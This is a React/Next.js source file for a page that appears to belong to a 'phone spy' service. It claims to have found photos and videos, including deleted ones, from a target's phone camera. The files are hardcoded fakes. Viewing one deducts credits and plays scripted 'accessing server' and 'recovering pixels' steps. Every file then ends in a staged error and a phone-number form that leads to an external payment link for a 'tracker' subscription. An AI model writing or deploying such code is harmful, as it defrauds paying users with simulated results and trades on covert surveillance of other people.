'use client';

import { motion, AnimatePresence } from 'framer-motion';
import { useState, useEffect, Suspense, useCallback } from 'react';
import { useRouter, useSearchParams } from 'next/navigation';
import Image from 'next/image';
import { useTranslation } from '@/lib/useTranslation';

type FileStatus = 'idle' | 'loading' | 'revealed' | 'error_loading' | 'error' | 'tracker_eye' | 'tracker_phone';

interface MediaFile {
  type: 'photo' | 'video';
  deleted: boolean;
  date: string;
  size: string;
  tags: string[];
  filename: string;
  image: string;
  trackerLink: string;
}

const mediaFiles: MediaFile[] = [
  {
    type: 'photo',
    deleted: false,
    date: 'Today at 17:30',
    size: '3.2 MB',
    tags: ['Recent'],
    filename: 'IMG_20260224_173012.jpg',
    image: '/camimage1.png',
    trackerLink: 'https://go.centerpag.com/PPU38CQ8AE5',
  },
  {
    type: 'photo',
    deleted: false,
    date: 'Today at 15:45',
    size: '2.8 MB',
    tags: ['Recent', 'Selfie'],
    filename: 'IMG_20260224_154522.jpg',
    image: '/camimage2.png',
    trackerLink: 'https://go.centerpag.com/PPU38CQ8AE5',
  },
  {
    type: 'video',
    deleted: false,
    date: 'Today at 14:10',
    size: '18.5 MB',
    tags: ['Video', 'Night'],
    filename: 'VID_20260224_141003.mp4',
    image: '/camvid1.png',
    trackerLink: 'https://go.centerpag.com/PPU38CQ8AE6',
  },
  {
    type: 'photo',
    deleted: true,
    date: 'Yesterday at 23:50',
    size: '4.1 MB',
    tags: ['Deleted', 'Night'],
    filename: 'IMG_20260223_235044_DEL.jpg',
    image: '/camimage3.png',
    trackerLink: 'https://go.centerpag.com/PPU38CQ8AE5',
  },
  {
    type: 'video',
    deleted: true,
    date: 'Yesterday at 22:15',
    size: '22.3 MB',
    tags: ['Deleted', 'Video'],
    filename: 'VID_20260223_221530_DEL.mp4',
    image: '/camvid2.png',
    trackerLink: 'https://go.centerpag.com/PPU38CQ8AE6',
  },
  {
    type: 'photo',
    deleted: false,
    date: '2 days ago at 19:00',
    size: '2.1 MB',
    tags: [],
    filename: 'IMG_20260222_190015.jpg',
    image: '/camimage4.png',
    trackerLink: 'https://go.centerpag.com/PPU38CQ8AE5',
  },
];

function CameraContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const { t } = useTranslation();
  const [currentCredits, setCurrentCredits] = useState(0);
  const [userEmail, setUserEmail] = useState('');
  const [showNoCreditsPopup, setShowNoCreditsPopup] = useState(false);
  const [fileStatuses, setFileStatuses] = useState<FileStatus[]>(mediaFiles.map(() => 'idle'));
  const [loadingProgress, setLoadingProgress] = useState<number[]>(mediaFiles.map(() => 0));
  const [loadingStep, setLoadingStep] = useState<number[]>(mediaFiles.map(() => 0));
  const [phoneNumbers, setPhoneNumbers] = useState<string[]>(mediaFiles.map(() => ''));

  const photoLoadingStepKeys = [
    'camera.accessing_server',
    'camera.opening_gallery',
    'camera.searching_image',
    'camera.validating',
    'camera.recovering_pixels',
    'camera.image_found',
  ] as const;

  const videoLoadingStepKeys = [
    'camera.accessing_server',
    'camera.opening_gallery',
    'camera.searching_video',
    'camera.validating',
    'camera.recovering_frames',
    'camera.video_found',
  ] as const;

  const photoErrorStepKeys = [
    'camera.recovering_image',
    'camera.downloading_data',
  ] as const;

  const videoErrorStepKeys = [
    'camera.recovering_video',
    'camera.downloading_data',
  ] as const;

  const getSteps = (keys: readonly string[]) => keys.map(k => t(k));

  const getUtmParams = useCallback(() => {
    const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content', 'fbclid', 'src', 'sck', 'xcod', 'lang'];
    const params = new URLSearchParams();
    utmKeys.forEach(key => {
      const value = searchParams.get(key);
      if (value) params.set(key, value);
    });
    return params.toString();
  }, [searchParams]);

  const appendUtmToPath = useCallback((basePath: string) => {
    const utmParams = getUtmParams();
    return utmParams ? `${basePath}?${utmParams}` : basePath;
  }, [getUtmParams]);

  useEffect(() => {
    const storedEmail = localStorage.getItem('user_email');
    if (storedEmail) {
      setUserEmail(storedEmail);
      fetch(`/api/credits?email=${encodeURIComponent(storedEmail)}`)
        .then(res => res.json())
        .then(data => {
          if (data.available !== undefined) setCurrentCredits(data.available);
        })
        .catch(() => {});
    }
  }, []);

  const updateFileStatus = (index: number, status: FileStatus) => {
    setFileStatuses(prev => { const n = [...prev]; n[index] = status; return n; });
  };

  const updateLoadingProgress = (index: number, value: number) => {
    setLoadingProgress(prev => { const n = [...prev]; n[index] = value; return n; });
  };

  const updateLoadingStep = (index: number, value: number) => {
    setLoadingStep(prev => { const n = [...prev]; n[index] = value; return n; });
  };

  const updatePhoneNumber = (index: number, value: string) => {
    setPhoneNumbers(prev => { const n = [...prev]; n[index] = value; return n; });
  };

  const runLoadingSequence = (index: number, steps: string[], onComplete: () => void) => {
    updateLoadingProgress(index, 0);
    updateLoadingStep(index, 0);

    const totalSteps = steps.length;
    let currentStep = 0;

    const stepInterval = setInterval(() => {
      currentStep++;
      if (currentStep >= totalSteps) {
        clearInterval(stepInterval);
        updateLoadingStep(index, totalSteps - 1);
        updateLoadingProgress(index, 100);
        setTimeout(onComplete, 600);
        return;
      }
      updateLoadingStep(index, currentStep);
      updateLoadingProgress(index, Math.round((currentStep / (totalSteps - 1)) * 100));
    }, 1200);
  };

  const handleViewMedia = async (index: number) => {
    const file = mediaFiles[index];
    const cost = file.deleted ? 80 : 40;

    if (!userEmail) {
      setShowNoCreditsPopup(true);
      return;
    }
    try {
      const res = await fetch('/api/credits', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email: userEmail, amount: cost }),
      });
      const data = await res.json();
      if (data.success) {
        setCurrentCredits(data.available);
        updateFileStatus(index, 'loading');
        const steps = file.type === 'video' ? getSteps(videoLoadingStepKeys) : getSteps(photoLoadingStepKeys);
        runLoadingSequence(index, steps, () => {
          updateFileStatus(index, 'revealed');
        });
      } else {
        setShowNoCreditsPopup(true);
      }
    } catch {
      setShowNoCreditsPopup(true);
    }
  };

  const handleRevealPicture = (index: number) => {
    const file = mediaFiles[index];
    updateFileStatus(index, 'error_loading');
    const steps = file.type === 'video' ? getSteps(videoErrorStepKeys) : getSteps(photoErrorStepKeys);
    runLoadingSequence(index, steps, () => {
      updateFileStatus(index, 'error');
    });
  };

  const handleUnlockTrackerEye = (index: number) => {
    updateFileStatus(index, 'tracker_phone');
  };

  const photoCount = mediaFiles.filter(f => f.type === 'photo').length;
  const videoCount = mediaFiles.filter(f => f.type === 'video').length;
  const deletedCount = mediaFiles.filter(f => f.deleted).length;

  return (
    <div className="min-h-screen bg-black text-white p-4 pb-20">
      <div className="w-full max-w-md mx-auto space-y-3">
        <motion.div
          initial={{ opacity: 0, y: -10 }}
          animate={{ opacity: 1, y: 0 }}
          className="flex items-center justify-between mb-2"
        >
          <button
            onClick={() => router.push(appendUtmToPath('/dashboard'))}
            className="text-gray-400 text-sm hover:text-white transition-colors"
          >
            {t('common.back')}
          </button>
          <h1 className="text-white font-bold text-lg">{t('camera.title')}</h1>
          <div className="w-12" />
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          className="bg-gradient-to-b from-gray-800/50 to-[#0d0d14] border border-gray-600/30 rounded-2xl p-5"
        >
          <p className="text-purple-400 text-xs font-bold tracking-wider mb-2">{t('camera.scan_completed')}</p>
          <h2 className="text-white text-xl font-bold mb-1">{t('camera.media_found')}</h2>
          <p className="text-gray-400 text-sm mb-4">
            {t('camera.media_desc')}
          </p>
          <div className="grid grid-cols-3 gap-2">
            <div className="bg-[#0d0d14] border border-blue-500/30 rounded-xl p-3 text-center">
              <p className="text-blue-400 text-[10px] font-bold uppercase">{t('camera.photos')}</p>
              <p className="text-white font-bold text-lg">{photoCount}</p>
            </div>
            <div className="bg-[#0d0d14] border border-purple-500/30 rounded-xl p-3 text-center">
              <p className="text-purple-400 text-[10px] font-bold uppercase">{t('camera.videos')}</p>
              <p className="text-white font-bold text-lg">{videoCount}</p>
            </div>
            <div className="bg-[#0d0d14] border border-red-500/30 rounded-xl p-3 text-center">
              <p className="text-red-400 text-[10px] font-bold uppercase">{t('camera.deleted')}</p>
              <p className="text-white font-bold text-lg">{deletedCount}</p>
            </div>
          </div>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.1 }}
          className="bg-[#0d0d14] border border-gray-800 rounded-2xl p-4"
        >
          <h3 className="text-white font-bold mb-3 flex items-center gap-2">
            {t('camera.detected_files')}
          </h3>

          <div className="space-y-3">
            {mediaFiles.map((file, index) => (
              <motion.div
                key={index}
                initial={{ opacity: 0, x: -10 }}
                animate={{ opacity: 1, x: 0 }}
                transition={{ delay: 0.15 + index * 0.05 }}
                className={`bg-[#1a1a2e] border rounded-xl p-4 ${
                  file.deleted ? 'border-red-500/30' : 'border-gray-700/50'
                }`}
              >
                <div className="flex items-start justify-between mb-1">
                  <div className="flex items-center gap-2 flex-wrap">
                    <span className="text-lg">
                      {file.deleted ? '🗑️' : file.type === 'photo' ? '🖼️' : '🎥'}
                    </span>
                    <span className="text-white font-bold text-sm">{file.filename}</span>
                  </div>
                </div>
                <div className="flex items-center gap-2 mt-1 flex-wrap">
                  <span className="text-gray-500 text-xs">{file.date}</span>
                  <span className="text-gray-600 text-xs">•</span>
                  <span className="text-gray-500 text-xs">{file.size}</span>
                  {file.tags.map((tag, i) => (
                    <span key={i} className={`text-[10px] font-semibold px-2 py-0.5 rounded-full ${
                      tag === 'Deleted'
                        ? 'bg-red-500/20 text-red-400'
                        : tag === 'Night'
                        ? 'bg-purple-500/20 text-purple-400'
                        : tag === 'Video'
                        ? 'bg-blue-500/20 text-blue-400'
                        : tag === 'Selfie'
                        ? 'bg-pink-500/20 text-pink-400'
                        : 'bg-gray-600/30 text-gray-400'
                    }`}>
                      {tag}
                    </span>
                  ))}
                </div>

                <AnimatePresence mode="wait">
                  {fileStatuses[index] === 'idle' && (
                    <motion.div
                      key="idle"
                      initial={{ opacity: 0 }}
                      animate={{ opacity: 1 }}
                      exit={{ opacity: 0 }}
                      className="flex justify-end mt-2"
                    >
                      {file.deleted ? (
                        <motion.button
                          whileTap={{ scale: 0.97 }}
                          onClick={() => handleViewMedia(index)}
                          className="bg-red-600 hover:bg-red-500 text-white text-xs font-semibold px-3 py-1.5 rounded-lg"
                        >
                          {t('camera.recover_for')}
                        </motion.button>
                      ) : (
                        <motion.button
                          whileTap={{ scale: 0.97 }}
                          onClick={() => handleViewMedia(index)}
                          className="bg-purple-600 hover:bg-purple-500 text-white text-xs font-semibold px-3 py-1.5 rounded-lg"
                        >
                          {t('camera.view_for')}
                        </motion.button>
                      )}
                    </motion.div>
                  )}

                  {fileStatuses[index] === 'loading' && (
                    <motion.div
                      key="loading"
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0 }}
                      className="mt-4"
                    >
                      <div className="flex items-center gap-2 mb-2">
                        <div className="w-4 h-4 border-2 border-purple-500 border-t-transparent rounded-full animate-spin" />
                        <span className="text-purple-400 text-sm font-semibold">
                          {(file.type === 'video' ? getSteps(videoLoadingStepKeys) : getSteps(photoLoadingStepKeys))[loadingStep[index]] || t('common.processing')}
                        </span>
                      </div>
                      <div className="w-full h-2 bg-gray-700 rounded-full overflow-hidden">
                        <motion.div
                          className="h-full bg-gradient-to-r from-purple-500 to-pink-500 rounded-full"
                          initial={{ width: '0%' }}
                          animate={{ width: `${loadingProgress[index]}%` }}
                          transition={{ duration: 0.5 }}
                        />
                      </div>
                      <p className="text-gray-500 text-xs mt-1 text-right">{loadingProgress[index]}%</p>
                    </motion.div>
                  )}

                  {fileStatuses[index] === 'revealed' && (
                    <motion.div
                      key="revealed"
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0 }}
                      className="mt-4"
                    >
                      <div className="relative w-full rounded-xl overflow-hidden mb-3" style={{ aspectRatio: '16/10' }}>
                        <Image
                          src={file.image}
                          alt={file.filename}
                          fill
                          className="object-cover"
                          unoptimized
                        />
                      </div>
                      <motion.button
                        whileTap={{ scale: 0.97 }}
                        onClick={() => handleRevealPicture(index)}
                        className="w-full py-3 rounded-xl font-bold text-white bg-green-600 hover:bg-green-500 transition-colors text-sm"
                      >
                        {file.type === 'video' ? t('camera.reveal_video') : t('camera.reveal_picture')}
                      </motion.button>
                    </motion.div>
                  )}

                  {fileStatuses[index] === 'error_loading' && (
                    <motion.div
                      key="error_loading"
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0 }}
                      className="mt-4"
                    >
                      <div className="flex items-center gap-2 mb-2">
                        <div className="w-4 h-4 border-2 border-purple-500 border-t-transparent rounded-full animate-spin" />
                        <span className="text-purple-400 text-sm font-semibold">
                          {(file.type === 'video' ? getSteps(videoErrorStepKeys) : getSteps(photoErrorStepKeys))[loadingStep[index]] || t('common.processing')}
                        </span>
                      </div>
                      <div className="w-full h-2 bg-gray-700 rounded-full overflow-hidden">
                        <motion.div
                          className="h-full bg-gradient-to-r from-purple-500 to-pink-500 rounded-full"
                          initial={{ width: '0%' }}
                          animate={{ width: `${loadingProgress[index]}%` }}
                          transition={{ duration: 0.5 }}
                        />
                      </div>
                      <p className="text-gray-500 text-xs mt-1 text-right">{loadingProgress[index]}%</p>
                    </motion.div>
                  )}

                  {fileStatuses[index] === 'error' && (
                    <motion.div
                      key="error"
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0 }}
                      className="mt-4"
                    >
                      <div className="bg-red-500/10 border border-red-500/30 rounded-xl p-4 mb-3">
                        <div className="flex items-center gap-2 mb-2">
                          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ef4444" strokeWidth="2">
                            <circle cx="12" cy="12" r="10"/>
                            <line x1="15" y1="9" x2="9" y2="15"/>
                            <line x1="9" y1="9" x2="15" y2="15"/>
                          </svg>
                          <span className="text-red-400 font-bold text-sm">{t('camera.error')}</span>
                        </div>
                        <p className="text-red-300 text-sm">
                          {file.type === 'video' ? t('camera.deleted_video_msg') : t('camera.deleted_photo_msg')}
                        </p>
                      </div>

                      <div className="bg-green-900/40 border border-green-400/50 rounded-xl p-4 mb-3">
                        <p className="text-white text-sm font-bold">
                          {file.type === 'video'
                            ? t('camera.notify_video')
                            : t('camera.notify_photo')}
                        </p>
                      </div>

                      <motion.button
                        whileTap={{ scale: 0.97 }}
                        onClick={() => handleUnlockTrackerEye(index)}
                        className="w-full py-3 rounded-xl font-bold text-white bg-gradient-to-r from-purple-600 to-pink-600 hover:opacity-90 transition-opacity text-sm"
                      >
                        {t('camera.unlock_tracker')}
                      </motion.button>

                      <p className="text-gray-500 text-xs text-center mt-2">
                        {file.type === 'video'
                          ? t('camera.tracker_sms_video')
                          : t('camera.tracker_sms_photo')}
                      </p>
                    </motion.div>
                  )}

                  {fileStatuses[index] === 'tracker_phone' && (
                    <motion.div
                      key="tracker_phone"
                      initial={{ opacity: 0, y: 10 }}
                      animate={{ opacity: 1, y: 0 }}
                      exit={{ opacity: 0 }}
                      className="mt-4"
                    >
                      <div className="bg-[#12121a] border border-purple-500/30 rounded-xl p-4 mb-3">
                        <p className="text-gray-300 text-sm mb-3">
                          {t('camera.add_phone')} {file.type === 'video' ? t('camera.videos').toLowerCase() : t('camera.photos').toLowerCase()}.
                        </p>
                        <div className="relative">
                          <span className="absolute left-3 top-1/2 -translate-y-1/2 text-gray-500 text-sm">📱</span>
                          <input
                            type="tel"
                            value={phoneNumbers[index]}
                            onChange={(e) => updatePhoneNumber(index, e.target.value)}
                            placeholder="(00) 00000-0000"
                            className="w-full bg-[#0d0d14] border border-gray-700 rounded-xl py-3 pl-10 pr-4 text-white placeholder-gray-500 focus:outline-none focus:border-purple-500 transition-colors text-sm"
                          />
                        </div>
                      </div>

                      <a
                        href={phoneNumbers[index].length >= 10 ? file.trackerLink : undefined}
                        target="_blank"
                        rel="noopener noreferrer"
                        className={`block w-full py-3 rounded-xl font-bold text-white text-center text-sm transition-all ${
                          phoneNumbers[index].length >= 10
                            ? 'bg-gradient-to-r from-green-600 to-emerald-600 hover:opacity-90 cursor-pointer'
                            : 'bg-gray-700 cursor-not-allowed opacity-50'
                        }`}
                        onClick={(e) => {
                          if (phoneNumbers[index].length < 10) e.preventDefault();
                        }}
                      >
                        {t('camera.subscribe_tracker')}
                      </a>
                    </motion.div>
                  )}
                </AnimatePresence>
              </motion.div>
            ))}
          </div>
        </motion.div>

        <motion.button
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.45 }}
          whileTap={{ scale: 0.97 }}
          onClick={() => router.push(appendUtmToPath('/dashboard'))}
          className="w-full py-3 rounded-xl font-semibold text-gray-400 bg-[#0d0d14] border border-gray-800 text-sm"
        >
          {t('common.back_dashboard')}
        </motion.button>
      </div>

      <AnimatePresence>
        {showNoCreditsPopup && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-black/80 flex items-center justify-center z-50 p-4"
            onClick={() => setShowNoCreditsPopup(false)}
          >
            <motion.div
              initial={{ scale: 0.9, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.9, opacity: 0 }}
              onClick={(e) => e.stopPropagation()}
              className="bg-[#1c1c2e] border border-gray-700 rounded-2xl p-6 max-w-sm w-full text-center"
            >
              <div className="text-4xl mb-3">💳</div>
              <h3 className="text-white font-bold text-lg mb-2">{t('common.insufficient_credits')}</h3>
              <p className="text-gray-400 text-sm mb-2">
                {t('common.not_enough_credits')}
              </p>
              <p className="text-yellow-400 text-sm mb-4">
                {t('common.your_balance')} {currentCredits} credits
              </p>
              <motion.button
                whileTap={{ scale: 0.97 }}
                onClick={() => router.push(appendUtmToPath('/buy'))}
                className="w-full py-3 rounded-xl font-bold text-white mb-2"
                style={{ background: 'linear-gradient(135deg, #7c3aed, #a855f7)' }}
              >
                {t('common.buy_credits')}
              </motion.button>
              <button
                onClick={() => setShowNoCreditsPopup(false)}
                className="text-gray-400 text-sm hover:text-white transition-colors"
              >
                {t('common.close')}
              </button>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}

export default function CameraPage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen bg-black flex items-center justify-center">
        <div className="w-8 h-8 border-2 border-purple-500 border-t-transparent rounded-full animate-spin" />
      </div>
    }>
      <CameraContent />
    </Suspense>
  );
}
